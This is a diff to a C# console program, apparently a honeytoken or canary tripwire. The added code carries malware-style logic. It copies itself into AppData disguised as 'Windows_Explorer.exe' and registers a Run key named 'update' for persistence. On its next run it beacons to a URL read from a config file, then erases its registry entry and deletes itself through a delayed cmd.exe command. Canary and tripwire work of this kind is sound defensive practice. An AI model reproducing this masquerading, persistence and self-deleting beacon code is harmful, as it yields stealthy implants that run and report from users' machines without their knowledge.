@@ -3,13 +3,19 @@ using System;
 using System.IO;
 using System.Management;
 using System.Reflection;
-using System.Net.NetworkInformation;
 using System.Net.Http;
+using System.Diagnostics;
 
 namespace Test
 {
     internal class Program
     {
+        static String getUrl()
+        {
+            string[] lines = File.ReadAllLines("server_detail.txt");
+            return lines[0];
+
+        }
         static void removefolder()
         {
             string Path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
@@ -21,10 +27,16 @@ namespace Test
                 file.Delete();
             }
         }
+
+    
+
         static void Main(string[] args)
         {
-           
-            var ExploitFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Explorer.exe";
+            /*Console.WriteLine(getUrl());*/
+
+            var ExploitFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +"\\Windows_Explorer.exe";
+            var ExploitPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
             if (!File.Exists(ExploitFile))
             {
                 /////////////////
@@ -51,45 +63,29 @@ namespace Test
                 string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
 
                 string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
+                string server_detail_path = AppDomain.CurrentDomain.BaseDirectory + "\\" + "server_detail.txt";
                 File.Copy(Path, ExploitFile);
+                File.Copy(server_detail_path, ExploitPath + "\\server_detail.txt");
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.SetValue("update", ExploitFile);
             }
             else
             {
                 Console.WriteLine("Here");
                 HttpClient client = new HttpClient();
-                /*client.BaseAddress = new Uri("http://192.168.100.156:5000/");*/
 
-                var res = client.GetAsync("http://192.168.100.156:5000/api/honeytoken/ping/1").Result;
-                
+                var res = client.GetAsync(getUrl()).Result;
+
                 Console.WriteLine(res);
-                File.Delete(ExploitFile);
+                File.Delete(ExploitPath + "\\server_detail.txt");
+
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.DeleteValue("update", false);
+                Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 /Q & Del " + ExploitFile);
+                System.Environment.Exit(0);
 
             }
 
-
-
-            //run our exe on startup
-
-
-
-            /*extractResource("")*/
-        }
-        public static void extractResource(String embeddedFileName, String destinationPath)
-        {
-            var currentAssembly = Assembly.GetExecutingAssembly();
-            var arrResources = currentAssembly.GetManifestResourceNames();
-            foreach (var resourceName in arrResources)
-            {
-                if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
-                {
-                    using (var resourceToSave = currentAssembly.GetManifestResourceStream(resourceName))
-                    {
-                        using (var output = File.OpenWrite(destinationPath))
-                            resourceToSave.CopyTo(output);
-                        resourceToSave.Close();
-                    }
-                }
-            }
         }
     }
 }
